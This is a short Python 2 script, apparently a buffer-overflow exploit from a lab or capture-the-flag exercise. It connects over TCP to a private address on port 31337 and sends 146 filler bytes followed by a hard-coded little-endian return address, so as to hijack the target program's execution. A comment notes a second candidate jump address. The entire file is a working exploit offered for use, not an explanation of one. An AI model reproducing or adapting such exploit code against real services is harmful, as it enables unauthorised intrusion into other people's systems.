#!/usr/bin/python
import sys
import socket

# 0x080414c3 = \xc3\x14\x04\x08
# 0x080416bf = \xbf\x16\x04\x08
shellcode = "A" * 146 + "\xc3\x14\x04\x08"

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = s.connect(('10.11.23.92',31337))
	s.send(shellcode + '\r\n')
	s.recv(1024)
	s.close()

except:
	print "Error connecting to remote machine."
	sys.exit() 